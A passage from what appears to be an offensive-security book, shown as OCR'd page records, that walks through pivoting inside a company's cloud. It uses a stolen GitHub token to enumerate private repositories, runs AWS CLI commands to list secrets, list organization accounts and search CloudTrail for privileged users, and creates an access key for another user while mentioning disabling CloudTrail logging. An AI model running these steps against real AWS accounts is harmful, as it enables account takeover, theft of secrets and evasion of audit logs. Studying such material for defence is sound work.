- pgno: 247
  md: "The second option, on the other hand, is way stealthier, but it assumes that\
    \ the IT department shares some ties with the rest of the infrastructure that\
    \ we can leverage, like a Lambda function, an IAM role, an S3 bucket, a user—basically\
    \ a needle in a scattered haystack . . . or is it?\n\nCome to think of it, there\
    \ is actually something that has a high probability of being shared between the\
    \ IT department and the infrastructure team: the GitHub account. Surely they did\
    \ not register two accounts just to please the two tech teams, did they?\n\nLet's\
    \ load the GitHub token we retrieved from Jenkins and look for references to Google\
    \ Workspace, Gmail, Google Drive, and so on. We write a brief Python script to\
    \ load repository names:\n\n```\n```python\n# list_repos.py\nfrom github import\
    \ Github\ng = Github(\"8e24ffcc0eeddee673ffa0ce5433ffcee7ace561\")\nfor repo in\
    \ g.get_user().get_repos():\n    print(repo.name, repo.clone_url)\n```\n```\n\n\
    ```\n```\nroot@Point1:~/# python3 list_repos.py > list_repos_gp.txt\nroot@Point1:~/#\
    \ egrep -i \"it[_-]|gapps|gsuite|users?\" list_repos_gp.txt\n\nit-service    \
    \  https://github.com/gretschp/it-service.git\nit-gsuite-apps  https://github.com/gretschp/it-gsuite-apps.git\n\
    users-sync      https://github.com/gretschp/users-sync\n--snip--\n```\n```\n\n\
    A clear indication of cross-pollination ①. We clone the source code of it-gsuite-apps\
    \ and . . . what do you know?! It's a list of applications and services used to\
    \ automate many Google Workspace admin actions, like user provisioning, organizational\
    \ unit (OU) assignments, terminating accounts, and so on:\n\n```\n```\nroot@Point1:~/#\
    \ ls -lh it-gsuite-apps\n\ntotal 98M\ndrwxrwxrwx 1 root root  7.9M provisionner\n\
    drwxrwxrwx 1 root root 13.4M cron-tasks\ndrwxrwxrwx 1 root root  6.3M assign-ou\n\
    --snip--\n```\n```\n\nThese are exactly the types of actions we need to use to\
    \ achieve control over Google Workspace! Of course, this sensitive repo is not\
    \ visible to regular users, but I guess impersonating Jenkins has its perks.\n\
    \nWe start dreaming about pulling the CEO's emails and exposing this fraudulent\
    \ business, but we quickly realize that this repo does not contain a single cleartext\
    \ password.\n\nWhile AWS relies on access keys to authenticate users and roles,\
    \ Google opted for the OAuth2 protocol, which requires explicit user interaction.\
    \ Essentially, a web browser will open up, authenticate the user, and produce\
    \ a validation code that must be pasted back into the command line to generate\
    \ a temporary private key to call Google Workspace APIs."
  merge: -1
  img_proc: true
- pgno: 248
  md: "Machines cannot follow this authentication flow, so Google also provides service\
    \ accounts that can authenticate using private keys. Yet, when looking at the\
    \ source code, we do not find the slightest hint of private keys:\n\n```\nroot@Point1:~/it-gsuite-apps/#\
    \ grep -Ri \"BEGIN PRIVATE KEY\" *\nroot@Point1:~/it-gsuite-apps/#\n```\n\n> NOTE\n\
    *The caveat is that service accounts can only be defined on Google Cloud Platform.\
    \ So, in effect, to use Google Workspace properly, one needs to subscribe to GCP\
    \ as well. Of course, this is mentioned nowhere in the docs, so you just magically\
    \ land on the GCP platform from a Google Workspace window.*\n\nSo, we dive into\
    \ the code of it-gsuite-apps to understand how the app acquires its Google Workspace\
    \ privileges and stumble upon the lines shown in Listing 13-2.\n\n```\n--snip--\n\
    getSecret(SERVICE_TOKEN);\n--snip--\npublic static void getSecret(String token)\
    \ {\n    String secretName = token;\n    String endpoint = \"secretsmanager.eu-west-1.amazonaws.com\"\
    ;\n    String region = \"eu-west-1\";\n\n    AwsClientBuilder.EndpointConfiguration\
    \ config = new AwsClientBuilder.\nEndpointConfiguration(endpoint, region);\n--snip--\n\
    ```\n\n*Listing 13-2: A code excerpt that loads a service token from AWS Secrets\
    \ Manager*\n\nNow it makes sense. The secret is not hardcoded in the app but retrieved\
    \ dynamically through Secrets Manager, an AWS service for centralizing and storing\
    \ secrets. We don’t have the secret’s name, but lucky for us, we have full admin\
    \ privileges, so we can easily search for it:\n\n```\nroot@Point1:~/# aws secretsmanager\
    \ list-secrets \\\n--region eu-west-1 \\\n--profile rundeck\n\n\"Name\": \"inf/instance-api/api-token\"\
    ,\n\"Name\": \"inf/rundeck/mysql/test_user\",\n\"Name\": \"inf/rundeck/cleanlog/apikey\"\
    ,\n\"Name\": \"inf/openvpn/vpn-employees\",\n--snip--\n```\n\nUnfortunately, no\
    \ amount of grepping reveals anything remotely related to Google Workspace. We\
    \ manually inspect every entry just in case, but the hard reality quietly dawns\
    \ on us: the IT department must be using another AWS account. That’s the only\
    \ rational explanation.\n\nNo need to panic, though. Hopping over to the IT AWS\
    \ account will not require the same stunt we pulled when jumping from MXR Ads\
    \ to GP."
  merge: -1
  img_proc: true
- pgno: 249
  md: "Those two companies are different (though intertwined) legal entities. They\
    \ have completely separate AWS accounts. The IT department, however, is part of\
    \ GP just as much as the regular tech team. It’s the same entity that pays the\
    \ bills in the end.\n\nThe most probable configuration is that GP created an AWS\
    \ organization, an entity that can house multiple AWS accounts: an account for\
    \ the tech team, another for the IT department, another for testing, and so on.\
    \ In such a configuration, one of the AWS accounts is promoted to the “master”\
    \ status. This special account can be used to attach new accounts to the organization\
    \ and apply global policies limiting the available set of services in each account.\n\
    \nThe master account is usually devoid of any infrastructure and should—in an\
    \ ideal world—delegate management tasks like log aggregation, billing reports,\
    \ and such to other accounts. We can easily confirm our hypothesis by calling\
    \ the list-accounts AWS API using our all-powerful rundeck role (see Listing 13-3).\n\
    \n```\nroot@point1:~/# aws organizations list-accounts\n\"Accounts\": [\n  Id:\
    \ 983457354409, Name: GP Infra, Email: infra-admin@gre...\n  Id: 354899546107,\
    \ Name: GP Lab, Email: gp-lab@gretschpoli...\n  ① Id: 345673068670, Name: GP IT,\
    \ Email: admin-it@gretschpoli...\n--snip--\n```\n\nListing 13-3: Listing the AWS\
    \ accounts\n\nLooking good. We can see the admin account, as expected ①.\n\nWhen\
    \ creating a member account, AWS automatically provisions a default role called\
    \ OrganizationAccountAccessRole. This role’s default trust policy allows impersonation\
    \ from any user of the management account capable of issuing the Security Token\
    \ Service (STS) assume-role API call. Let’s see if we can get its credentials:\n\
    \n```\nroot@point1:~/# aws sts assume-role \\\n  --role-session-name maintenance\
    \ \\\n  --role-arn arn:aws:iam::345673068670:role/OrganizationAccountAccessRole\
    \ \\\n  --profile rundeck\n\nAn error occurred (AccessDenied) when calling the\
    \ AssumeRole operation...\n```\n\nDarn it, we were so close! If even Rundeck is\
    \ not authorized to impersonate the OrganizationAccountAccessRole, it means that\
    \ either the role was deleted or its trust policy has been restricted to a select\
    \ few. If only there were a central system that logged every API request on AWS\
    \ so we could look up these privileged users . . . hello, CloudTrail!\n\n# Abusing\
    \ CloudTrail\n\nEvery time a user or role assumes a role, that query is logged\
    \ on CloudTrail and, in the case of GP, pushed to CloudWatch and S3. We can leverage\
    \ this"
  merge: -1
  img_proc: true
- pgno: 250
  md: "ever-watchful system to single out those users and roles allowed to hop over\
    \ to the IT account. CloudTrail's API does not provide many filtering capabilities,\
    \ so we will instead use CloudWatch's powerful filter-log-events command.\n\n\
    First, we get the name of the log group that aggregates CloudTrail logs:\n\n```\n\
    root@Pointi1:~/# aws logs describe-log-groups \\\n--region=eu-west-1 \\\n--profile\
    \ test\n--snip--\nlogGroupName: CloudTrail/DefaultLogGroup\n--snip--\n```\n\n\
    Then, as shown in Listing 13-4, it's simply a matter of searching for occurrences\
    \ of the IT account identifier 345673068670, which we got from Listing 13-3.\n\
    \n```\nroot@Pointi1:~/# aws logs filter-log-events \\\n--log-group-name \"CloudTrail/DefaultLogGroup\"\
    \ \\\n--filter-pattern \"345673068670\" \\\n--max-items 10 \\\n--profile rundeck\
    \ \\\n--region eu-west-1 \\\n| jq \".events[].message\" \\\n| sed 's/\\\\/\\\\\
    /g'\n\n\"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"arn\": \"arn:aws:iam::983457354409:user/elis.skyler\"\
    ,\n    \"accountId\": \"983457354409\",\n    \"accessKeyId\": \"AKIA4A2RK6WS4G7MGL6W\"\
    ,\n    \"userName\": \"elis.skyler\"\n},\n\"requestParameters\": {\n    \"roleArn\"\
    : \"arn:aws:iam::345673068670:role/\nOrganizationAccountAccessRole\",\n    \"\
    responseElements\": {\"credentials\": {\n--snip--\n```\n\n# Listing 13-4: CloudTrail\
    \ event showing elis.skyler impersonating a role inside the IT account\n\nLooks\
    \ like elis.skyler impersonated the OrganizationAccountAccessRole a few hours\
    \ ago. Time to grace this account with an additional access key that we can use\
    \ to assume the foreign role ourselves. Of course, we are going to temporarily\
    \ blind CloudTrail for this maneuver, but I will omit the code since you are familiar\
    \ with that technique already from Chapter 11:\n\n```\nroot@Pointi1:~/# aws iam\
    \ create-access-key \\\n--user-name elis.skyler \\\n--profile rundeck\n```"
